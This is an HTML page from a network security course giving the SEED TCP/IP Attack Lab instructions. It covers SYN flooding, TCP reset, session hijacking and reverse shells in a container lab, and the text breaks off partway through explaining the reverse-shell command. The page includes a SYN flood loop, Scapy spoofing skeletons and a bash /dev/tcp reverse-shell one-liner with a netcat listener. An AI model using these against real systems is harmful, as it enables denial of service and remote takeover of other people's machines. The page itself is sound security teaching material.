

<!DOCTYPE html>
<html class="writer-html4" lang="en" >
<head>
  <meta charset="utf-8" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <title>TCP/IP Attack Lab &mdash; Network Security Lab  documentation</title>
  

  
  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />

  
  

  
  

  

  
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
        <script type="text/javascript" src="../../_static/jquery.js"></script>
        <script type="text/javascript" src="../../_static/underscore.js"></script>
        <script type="text/javascript" src="../../_static/doctools.js"></script>
        <script type="text/javascript" src="../../_static/language_data.js"></script>
        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    
    <script type="text/javascript" src="../../_static/js/theme.js"></script>

    
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Virtual Private Network (VPN) Lab" href="VPN.html" />
    <link rel="prev" title="Packet Sniffing and Spoofing Lab" href="Sniffing_Spoofing.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="../../index.html" class="icon icon-home"> Network Security Lab
          

          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        
        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
<li class="toctree-l2 current"><a class="reference internal" href="network_index.html">Network Security Labs</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="arp_attack.html">ARP Cache Poisoning Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="bgp_basic.html">BGP Lab: Building an Internet Simulator</a></li>
<li class="toctree-l3"><a class="reference internal" href="dns_in_a_box.html">DNS In a Box</a></li>
<li class="toctree-l3"><a class="reference internal" href="dns_local.html">Local DNS Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="dns_rebinding.html">DNS Rebinding Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="dns_remote.html">The Kaminsky Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="dnssec.html">DNS Security Extensions (DNSSEC) Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="firewall.html">Firewall Exploration Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="firewall_vpn.html">Firewall Evasion Lab: Bypassing Firewalls using VPN</a></li>
<li class="toctree-l3"><a class="reference internal" href="Heartbleed.html">Heartbleed Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="ICMP_Redirect.html">ICMP Redirect Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Mitnick_Attack.html">The Mitnick Attack Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="Sniffing_Spoofing.html">Packet Sniffing and Spoofing Lab</a></li>
<li class="toctree-l3 current"><a class="current reference internal" href="#">TCP/IP Attack Lab</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
<li class="toctree-l4"><a class="reference internal" href="#lab-environment">Lab Environment</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-1-syn-flooding-attack">Task 1: SYN Flooding Attack</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-2-tcp-rst-attacks-on-telnet-connections">Task 2: TCP RST Attacks on <code class="docutils literal notranslate"><span class="pre">telnet</span></code> Connections</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-3-tcp-session-hijacking">Task 3: TCP Session Hijacking</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-4-creating-reverse-shell-using-tcp-session-hijacking">Task 4: Creating Reverse Shell using TCP Session Hijacking</a></li>
<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
<li class="toctree-l4"><a class="reference internal" href="#acknowledgment">Acknowledgment</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="VPN.html">Virtual Private Network (VPN) Lab</a></li>
<li class="toctree-l3"><a class="reference internal" href="VPN_Tunnel.html">VPN Lab: The Container Version</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
</ul>

            
          
        </div>
        
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Network Security Lab</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          

















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
        
          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
        
          <li><a href="network_index.html">Network Security Labs</a> &raquo;</li>
        
      <li>TCP/IP Attack Lab</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="tcp-ip-attack-lab">
<h1>TCP/IP Attack Lab<a class="headerlink" href="#tcp-ip-attack-lab" title="Permalink to this headline">¶</a></h1>
<div class="section" id="overview">
<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
<p>The learning objective of this lab is for students to gain first-hand
experience on vulnerabilities, as well as on attacks against these
vulnerabilities. Wise people learn from mistakes. In security education,
we study mistakes that lead to software vulnerabilities. Studying
mistakes from the past not only help students understand why systems are
vulnerable, why a seemly-benign mistake can turn into a disaster, and
why many security mechanisms are needed. More importantly, it also helps
students learn the common patterns of vulnerabilities, so they can avoid
making similar mistakes in the future. Moreover, using vulnerabilities
as case studies, students can learn the principles of secure design,
secure programming, and security testing.</p>
<p>The vulnerabilities in the TCP/IP protocols represent a special genre of
vulnerabilities in protocol designs and implementations; they provide an
invaluable lesson as to why security should be designed in from the
beginning, rather than being added as an afterthought. Moreover,
studying these vulnerabilities help students understand the challenges
of network security and why many network security measures are needed.
In this lab, students will conduct several attacks on TCP. This lab
covers the following topics:</p>
<ul class="simple">
<li>The TCP protocol</li>
<li>TCP SYN flood attack, and SYN cookies</li>
<li>TCP reset attack</li>
<li>TCP session hijacking attack</li>
<li>Reverse shell</li>
<li>A special type of TCP attack, the Mitnick attack, is covered in a
separate lab.</li>
</ul>
<p><strong>Readings and videos.</strong> Detailed coverage of the TCP attacks can be found in the following:</p>
<ul class="simple">
<li>Chapter 16 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition,
by Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
<li>Section 6 of the SEED Lecture, Internet Security: A Hands-on Approach, by Wenliang Du. See details
at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
</ul>
<p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.</p>
</div>
<div class="section" id="lab-environment">
<h2>Lab Environment<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h2>
<p>In this lab, we need to have at least three machines. We use containers
to set up the lab environment. Figure&nbsp;1
depicts the lab setup. We will use the attacker container to launch
attacks, while using the other three containers as the victim and user
machines. We assume all these machines are on the same LAN. Students can
also use three virtual machines for this lab, but it will be much more
convenient to use containers.</p>
<div class="figure align-center" id="id1">
<img alt="../../_images/tcp_attacks_img1.png" src="../../_images/tcp_attacks_img1.png" />
<p class="caption"><span class="caption-text">Figure 1: Lab environment setup</span></p>
</div>
<div class="section" id="container-setup-and-commands">
<h3>Container Setup and Commands<a class="headerlink" href="#container-setup-and-commands" title="Permalink to this headline">¶</a></h3>
<p>Please download the <code class="docutils literal notranslate"><span class="pre">Labsetup.zip</span></code> file to your VM from the lab’s website, unzip it, enter the <code class="docutils literal notranslate"><span class="pre">Labsetup</span></code>
folder, and use the <code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> file to set up the lab environment. Detailed explanation of the
content in this file and all the involved <code class="docutils literal notranslate"><span class="pre">Dockerfile</span></code> can be found from the user manual, which is linked
to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is
very important that you read the user manual.</p>
<p>In the following, we list some of the commonly used commands related to Docker and Compose. Since
we are going to use these commands very frequently, we have created aliases for them in the <code class="docutils literal notranslate"><span class="pre">.bashrc</span></code> file
(in our provided SEEDUbuntu 20.04 VM).</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ docker-compose build    # Build the container image
$ docker-compose up       # Start the container
$ docker-compose down     # Shut down the container

// Aliases for the Compose commands above
$ dcbuild                 # Alias for: docker-compose build
$ dcup                    # Alias for: docker-compose up
$ dcdown                  # Alias for: docker-compose down
</pre></div>
</div>
<p>All the containers will be running in the background. To run commands on a container, we often need
to get a shell on that container. We first need to use the “<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">ps</span></code>” command to find out the ID of
the container, and then use “<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">exec</span></code>” to start a shell on that container. We have created aliases for
them in the <code class="docutils literal notranslate"><span class="pre">.bashrc</span></code> file.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ dockps        // Alias for: docker ps --format &quot;{{.ID}} {{.Names}}&quot;
$ docksh &lt;id&gt;   // Alias for: docker exec -it &lt;id&gt; /bin/bash

// The following example shows how to get a shell inside hostC
$ dockps
b1004832e275 hostA-10.9.0.5
0af4ea7a3e2e hostB-10.9.0.6
9652715c8e0a hostC-10.9.0.7

$ docksh 96
root@9652715c8e0a:/#

// Note: If a docker command requires a container ID, you do not need to
//       type the entire ID string. Typing the first few characters will
//       be sufficient, as long as they are unique among all the containers.
</pre></div>
</div>
<p>If you encounter problems when setting up the lab environment, please read the “Common Problems”
section of the manual for potential solutions.</p>
</div>
<div class="section" id="about-the-attacker-container">
<h3>About the Attacker Container<a class="headerlink" href="#about-the-attacker-container" title="Permalink to this headline">¶</a></h3>
<p>In this lab, we can either use the VM or the attacker container as the
attacker machine. If you look at the Docker Compose file, you will see
that the attacker container is configured differently from the other
containers.</p>
<ul>
<li><p class="first"><em>Shared folder.</em> When we use the attacker container to launch
attacks, we need to put the attacking code inside the attacker
container.Code editing is more convenient inside the VM than in containers,
because we can use our favorite editors. In order for the VM and container to share files, we have
created a shared folder between the VM and the container using the Docker <code class="docutils literal notranslate"><span class="pre">volumes</span></code>. If you look
at the Docker Compose file, you will find out that we have added the following entry to some of the
containers. It indicates mounting the <code class="docutils literal notranslate"><span class="pre">./volumes</span></code> folder on the host machine (i.e., the VM) to the
<code class="docutils literal notranslate"><span class="pre">/volumes</span></code> folder inside the container. We will write our code in the <code class="docutils literal notranslate"><span class="pre">./volumes</span></code> folder (on the
VM), so they can be used inside the containers.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>volumes:
      ./volumes:/volumes
</pre></div>
</div>
</li>
<li><p class="first"><em>Host mode.</em> In this lab, the attacker needs to be able to sniff packets, but running sniffer programs
inside a container has problems, because a container is effectively attached to a virtual switch, so it
can only see its own traffic, and it is never going to see the packets among other containers. To solve
this problem, we use the <code class="docutils literal notranslate"><span class="pre">host</span></code> mode for the attacker container. This allows the attacker container to
see all the traffics. The following entry used on the attacker container:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>network_mode: host
</pre></div>
</div>
<p>When a container is in the <code class="docutils literal notranslate"><span class="pre">host</span></code> mode, it sees all the host’s network interfaces, and it even has the
same IP addresses as the host. Basically, it is put in the same network namespace as the host VM.
However, the container is still a separate machine, because its other namespaces are still different
from the host.</p>
</li>
</ul>
</div>
<div class="section" id="the-seed-account">
<h3>The seed Account<a class="headerlink" href="#the-seed-account" title="Permalink to this headline">¶</a></h3>
<p>In this lab, we need to telnet from one containter to another. We have
already created an account called <code class="docutils literal notranslate"><span class="pre">seed</span></code> inside all the containers.
Its password is <code class="docutils literal notranslate"><span class="pre">dees</span></code>. You can telnet into this account.</p>
</div>
</div>
<div class="section" id="task-1-syn-flooding-attack">
<h2>Task 1: SYN Flooding Attack<a class="headerlink" href="#task-1-syn-flooding-attack" title="Permalink to this headline">¶</a></h2>
<div class="figure align-center" id="id2">
<img alt="../../_images/tcp_attacks_img2.png" src="../../_images/tcp_attacks_img2.png" />
<p class="caption"><span class="caption-text">Figure 2: SYN Flooding Attack</span></p>
</div>
<p>SYN flood is a form of DoS attack in which attackers send many SYN
requests to a victim’s TCP port, but the attackers have no intention to
finish the 3-way handshake procedure. Attackers either use spoofed IP
address or do not continue the procedure. Through this attack, attackers
can flood the victim’s queue that is used for half-opened connections,
i.e. the connections that has finished SYN, SYN-ACK, but has not yet
gotten a final ACK back. When this queue is full, the victim cannot take
any more connection. Figure&nbsp;2 illustrates the attack.</p>
<p>The size of the queue has a system-wide setting. In Ubuntu OSes, we can
check the setting using the following command. The OS sets this value
based on the amount of the memory the system has: the more memory the
machine has, the larger this value will be.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
</pre></div>
</div>
<p>We can use command <code class="docutils literal notranslate"><span class="pre">&quot;netstat</span> <span class="pre">-nat&quot;</span></code> to check the usage of the queue,
i.e., the number of half-opened connection associated with a listening
port. The state for such connections is <code class="docutils literal notranslate"><span class="pre">SYN-RECV</span></code>. If the 3-way
handshake is finished, the state of the connections will be ESTABLISHED.</p>
<p><strong>SYN Cookie Countermeasure:</strong> By default, Ubuntu’s SYN flooding countermeasure is turned on. This
mechanism is called SYN cookie. It will kick in if the machine detects
that it is under the SYN flooding attack. In our victim server
container, we have already turned it off (see the <code class="docutils literal notranslate"><span class="pre">sysctls</span></code> entry in
the <code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> file). We can use the following <code class="docutils literal notranslate"><span class="pre">sysctl</span></code>
command to turn it on and off:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl -a | grep syncookies     (Display the SYN cookie flag)
# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
# sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
</pre></div>
</div>
<p>To be able to use <code class="docutils literal notranslate"><span class="pre">sysctl</span></code> to change the system variables inside a
container, the container needs to be configured with the
<code class="docutils literal notranslate"><span class="pre">&quot;privileged:</span> <span class="pre">true&quot;</span></code> entry (which is the case for our victim server).
Without this setting, if we run the above command, we will see the
following error message. The container is not given the privilege to
make the change.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl -w net.ipv4.tcp_syncookies=1
sysctl: setting key &quot;net.ipv4.tcp_syncookies&quot;: Read-only file system
</pre></div>
</div>
<div class="section" id="task-1-1-launching-the-attack-using-python">
<h3>Task 1.1: Launching the Attack Using Python<a class="headerlink" href="#task-1-1-launching-the-attack-using-python" title="Permalink to this headline">¶</a></h3>
<p>We provide a Python program called <code class="docutils literal notranslate"><span class="pre">synflood.py</span></code>, but we have
intentionally left out some essential data in the code. This code sends
out spoofed TCP SYN packets, with randomly generated source IP address,
source port, and sequence number. Students should finish the code and
then use it to launch the attack on the target machine:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst=&quot;*.*.*.*&quot;)
tcp = TCP(dport=**, flags=&#39;S&#39;)
pkt = ip/tcp

while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # source iP
    pkt[TCP].sport = getrandbits(16)     # source port
    pkt[TCP].seq   = getrandbits(32)     # sequence number
    send(pkt, verbose = 0)
</pre></div>
</div>
<p>Let the attack run for at least one minute, then try to telnet into the
victim machine, and see whether you can succeed. Very likely that your
attack will fail. Multiple issues can contribute to the failure of the
attack. They are listed in the following with guidelines on how to
address them.</p>
<ul>
<li><p class="first"><strong>TCP cache issue:</strong> See Note A below.</p>
</li>
<li><p class="first"><strong>VirtualBox issue:</strong> If you are doing the attack from one VM against
another VM, instead of using our container setup, please see Note B
below. This is not an issue if you are doing the attack using the
container setup.</p>
</li>
<li><p class="first"><strong>TCP retransmission issue:</strong> After sending out the SYN+ACK packet,
the victim machine will wait for the ACK packet. If it does not come
in time, TCP will retransmit the SYN+ACK packet. How many times it
will retransmit depends on the following kernel parameters (by
default, its value is 5):</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl net.ipv4.tcp_synack_retries
net.ipv4.tcp_synack_retries = 5
</pre></div>
</div>
<p>After these 5 retransmissions, TCP will remove the corresponding item
from the half-open connection queue. Every time when an item is
removed, a slot becomes open. Your attack packets and the legitimate
telnet connection request packets will fight for this opening. Our
Python program may not be fast enough, and can thus lose to the
legitimate telnet packet. To win the competition, we can run multiple
instances of the attack program in parallel. Please try this approach
and see whether the success rate can be improved. How many instances
should you run to achieve a reasonable success rate?</p>
</li>
<li><p class="first"><strong>The size of the queue:</strong> How many half-open connections can be
stored in the queue can affect the success rate of the attack. The
size of the queue be adjusted using the following command:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl -w net.ipv4.tcp_max_syn_backlog=80
</pre></div>
</div>
<p>While the attack is ongoing, you can run one of the following
commands on the victim container to see how many items are in the
queue. It should be noted that one fourth of the space in the queue
is reserved for “proven destinations” (see Note A below), so if we
set the size to 80, its actual capacity is about 60.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ netstat -tna | grep SYN_RECV | wc -l
$ ss -n state syn-recv sport = :23 | wc -l
</pre></div>
</div>
<p>Please reduce the size of the half-open connection queue on the
victim server, and see whether your success rate can improve.</p>
</li>
</ul>
<p><strong>Note A: A kernel mitigation mechanism.</strong> On Ubuntu 20.04, if machine X has never made a TCP connection to the
victim machine, when the SYN flooding attack is launched, machine X will
not be able to telnet into the victim machine. However, if before the
attack, machine X has already made a telnet (or TCP connection) to the
victim machine, then X seems to be “immune” to the SYN flooding attack,
and can successfully telnet to the victim machine during the attack. It
seems that the victim machine remembers past successful connections, and
uses this memory when establishing future connections with the
“returning” client. This behavior does not exist in Ubuntu 16.04 and
earlier versions.</p>
<p>This is due to a mitigation of the kernel: TCP reserves one fourth of
the backlog queue for “proven destinations” if SYN Cookies are disabled.
After making a TCP connection from <code class="docutils literal notranslate"><span class="pre">10.9.0.6</span></code> to the server
<code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>, we can see that the IP address <code class="docutils literal notranslate"><span class="pre">10.9.0.6</span></code> is remembered
(cached) by the server, so they will be using the reserved slots when
connections come from them, and will thus not be affected by the SYN
flooding attack. To remove the effect of this mitigation method, we can
run the <code class="docutils literal notranslate"><span class="pre">&quot;ip</span> <span class="pre">tcp_metrics</span> <span class="pre">flush&quot;</span></code> command on the server.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># ip tcp_metrics show
10.9.0.6 age 140.552sec cwnd 10 rtt 79us rttvar 40us source 10.9.0.5

# ip tcp_metrics flush
</pre></div>
</div>
<p><strong>Note B: RST packets.</strong> If you are doing this task using two VMs, i.e., launching the attack
from one VM against another VM, instead of attacking a container, from
the Wireshark, you will notice many RST packets (reset). Initially, we
thought that the packets were generated from the recipient of the
SYN+ACK packet, but it turns out they are generated by the NAT server in
our setup.</p>
<p>Any traffic going out of the VM in our lab setup will go through the NAT
server provided by VirtualBox. For TCP, NAT creates address translation
entries based on the SYN packet. In our attack, the SYN packets
generated by the attacker did not go through the NAT (both attacker and
victims are behind the NAT), so no NAT entry was created. When the
victim sends SYN+ACK packet back to the source IP (which is randomly
generated by the attacker), this packet will go out through the NAT, but
because there is no prior NAT entry for this TCP connection, NAT does
not know what to do, so it sends a TCP RST packet back to the victim.</p>
<p>RST packets cause the victim to remove the data from the half-open
connection queue. Therefore, while we are trying fill up this queue with
the attack, VirtualBox helps the victim to remove our records from the
queue. It becomes a competition between our code and the VirtualBox.</p>
</div>
<div class="section" id="task-1-2-launch-the-attack-using-c">
<h3>Task 1.2: Launch the Attack Using C<a class="headerlink" href="#task-1-2-launch-the-attack-using-c" title="Permalink to this headline">¶</a></h3>
<p>Other than the TCP cache issue, all the issues mentioned in Task 1.1 can
be resolved if we can send spoofed SYN packets fast enough. We can
achieve that using C. We provide a C program called <code class="docutils literal notranslate"><span class="pre">synflood.c</span></code> in
the lab setup. Please compile the program on the VM and then launch the
attack on the target machine.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// Compile the code on the host VM
$ gcc -o synflood synflood.c

// Launch the attack from the attacker container
# synflood 10.9.0.5 23
</pre></div>
</div>
<p>Before launching the attack, please restore the queue size to its
original value. Please compare the results with the one using the Python
program, and explain the reason behind the difference.</p>
</div>
<div class="section" id="task-1-3-enable-the-syn-cookie-countermeasure">
<h3>Task 1.3: Enable the SYN Cookie Countermeasure<a class="headerlink" href="#task-1-3-enable-the-syn-cookie-countermeasure" title="Permalink to this headline">¶</a></h3>
<p>Please enable the SYN cookie mechanism, and run your attacks again, and
compare the results.</p>
</div>
</div>
<div class="section" id="task-2-tcp-rst-attacks-on-telnet-connections">
<h2>Task 2: TCP RST Attacks on <code class="docutils literal notranslate"><span class="pre">telnet</span></code> Connections<a class="headerlink" href="#task-2-tcp-rst-attacks-on-telnet-connections" title="Permalink to this headline">¶</a></h2>
<p>The TCP RST Attack can terminate an established TCP connection between
two victims. For example, if there is an established <code class="docutils literal notranslate"><span class="pre">telnet</span></code>
connection (TCP) between two users A and B, attackers can spoof a RST
packet from A to B, breaking this existing connection. To succeed in
this attack, attackers need to correctly construct the TCP RST packet.</p>
<p>In this task, you need to launch a TCP RST attack from the VM to break
an existing <code class="docutils literal notranslate"><span class="pre">telnet</span></code> connection between A and B, which are containers.
To simplify the lab, we assume that the attacker and the victim are on
the same LAN, i.e., the attacker can observe the TCP traffic between A
and B.</p>
<p><strong>Launching the attack manually.</strong> Please use Scapy to conduct the TCP RST attack. A skeleton code is
provided in the following. You need to replace each <code class="docutils literal notranslate"><span class="pre">&#64;&#64;&#64;&#64;</span></code> with an
actual value (you can get them using Wireshark):</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src=&quot;@@@@&quot;, dst=&quot;@@@@&quot;)
tcp = TCP(sport=@@@@, dport=@@@@, flags=&quot;@@@@&quot;, seq=@@@@, ack=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
</pre></div>
</div>
<p><strong>Optional: Launching the attack automatically.</strong> Students are encouraged to write a program to launch the attack
automatically using the sniffing-and-spoofing technique. Unlike the
manual approach, we get all the parameters from sniffed packets, so the
entire attack is automated. Please make sure that when you use Scapy’s
<code class="docutils literal notranslate"><span class="pre">sniff</span></code> function, don’t forget to set the <code class="docutils literal notranslate"><span class="pre">iface</span></code> argument.</p>
</div>
<div class="section" id="task-3-tcp-session-hijacking">
<h2>Task 3: TCP Session Hijacking<a class="headerlink" href="#task-3-tcp-session-hijacking" title="Permalink to this headline">¶</a></h2>
<div class="figure align-center" id="id3">
<img alt="../../_images/tcp_attacks_img3.png" src="../../_images/tcp_attacks_img3.png" />
<p class="caption"><span class="caption-text">Figure 3: TCP Session Hijacking Attack</span></p>
</div>
<p>The objective of the TCP Session Hijacking attack is to hijack an
existing TCP connection (session) between two victims by injecting
malicious contents into this session. If this connection is a <code class="docutils literal notranslate"><span class="pre">telnet</span></code>
session, attackers can inject malicious commands (e.g. deleting an
important file) into this session, causing the victims to execute the
malicious commands. Figure&nbsp;3 depicts how the
attack works. In this task, you need to demonstrate how you can hijack a
<code class="docutils literal notranslate"><span class="pre">telnet</span></code> session between two computers. Your goal is to get the
<code class="docutils literal notranslate"><span class="pre">telnet</span></code> server to run a malicious command from you. For the
simplicity of the task, we assume that the attacker and the victim are
on the same LAN.</p>
<p><strong>Launching the attack manually.</strong> Please use Scapy to conduct the TCP Session Hijacking attack. A skeleton
code is provided in the following. You need to replace each <code class="docutils literal notranslate"><span class="pre">&#64;&#64;&#64;&#64;</span></code>
with an actual value; you can use Wireshark to figure out what value you
should put into each field of the spoofed TCP packets.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src=&quot;@@@@&quot;, dst=&quot;@@@@&quot;)
tcp = TCP(sport=@@@@, dport=@@@@, flags=&quot;@@@@&quot;, seq=@@@@, ack=@@@@)
data = &quot;@@@@&quot;
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
</pre></div>
</div>
<p><strong>Optional: Launching the attack automatically.</strong> Students are encouraged to write a program to launch the attack
automatically using the sniffing-and-spoofing technique. Unlike the
manual approach, we get all the parameters from sniffed packets, so the
entire attack is automated. Please make sure that when you use Scapy’s
<code class="docutils literal notranslate"><span class="pre">sniff</span></code> function, don’t forget to set the <code class="docutils literal notranslate"><span class="pre">iface</span></code> argument.</p>
</div>
<div class="section" id="task-4-creating-reverse-shell-using-tcp-session-hijacking">
<h2>Task 4: Creating Reverse Shell using TCP Session Hijacking<a class="headerlink" href="#task-4-creating-reverse-shell-using-tcp-session-hijacking" title="Permalink to this headline">¶</a></h2>
<p>When attackers are able to inject a command to the victim’s machine
using TCP session hijacking, they are not interested in running one
simple command on the victim machine; they are interested in running
many commands. Obviously, running these commands all through TCP session
hijacking is inconvenient. What attackers want to achieve is to use the
attack to set up a back door, so they can use this back door to
conveniently conduct further damages.</p>
<p>A typical way to set up back doors is to run a reverse shell from the
victim machine to give the attack the shell access to the victim
machine. Reverse shell is a shell process running on a remote machine,
connecting back to the attacker’s machine. This gives an attacker a
convenient way to access a remote machine once it has been compromised.</p>
<p>In the following, we will show how we can set up a reverse shell if we
can directly run a command on the victim machine (i.e. the server
machine). In the TCP session hijacking attack, attackers cannot directly
run a command on the victim machine, so their jobs is to run a
reverse-shell command through the session hijacking attack. In this
task, students need to demonstrate that they can achieve this goal.</p>
<p>To have a <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell on a remote machine connect back to the
attacker’s machine, the attacker needs a process waiting for some
connection on a given port. In this example, we will use <code class="docutils literal notranslate"><span class="pre">netcat</span></code>.
This program allows us to specify a port number and can listen for a
connection on that port. In the following demo, we show two windows,
each one is from a different machine. The top window is the attack
machine <code class="docutils literal notranslate"><span class="pre">10.9.0.1</span></code>, which runs <code class="docutils literal notranslate"><span class="pre">netcat</span></code>&nbsp;(<code class="docutils literal notranslate"><span class="pre">nc</span></code> for short),
listening on port <code class="docutils literal notranslate"><span class="pre">9090</span></code>. The bottom window is the victim machine
<code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>, and we type the reverse shell command. As soon as the
reverse shell gets executed, the top window indicates that we get a
shell. This is a reverse shell, i.e., it runs on <code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
           +---------------------------------------------------+
           | On 10.9.0.1 (attcker)                             |
           |                                                   |
           | $ nc -lnv 9090                                    |
           | Listening on 0.0.0.0 9090                         |
           | Connection received on 10.9.0.5 49382             |
           | $   &lt;--+ This shell runs on 10.9.0.5              |
           |                                                   |
           +---------------------------------------------------+

           +---------------------------------------------------+
           | On 10.9.0.5 (victim)                              |
           |                                                   |
           |$ /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1  |
           |                                                   |
           +---------------------------------------------------+
</pre></div>
</div>
<p>We provide a brief description on the reverse shell command in the
following. Detailed explanation can be found in the SEED book.</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&quot;/bin/bash</span> <span class="pre">-i&quot;</span></code>: <code class="docutils literal notranslate"><span class="pre">i</span></code> stands for interactive, meaning that the
shell must be interactive (must provide a shell prompt)</li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;&gt;</span> <span class="pre">/dev/tcp/10.9.0.1/9090&quot;</span></code>: This causes the output (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>)
of the shell to be redirected to the tcp connection to
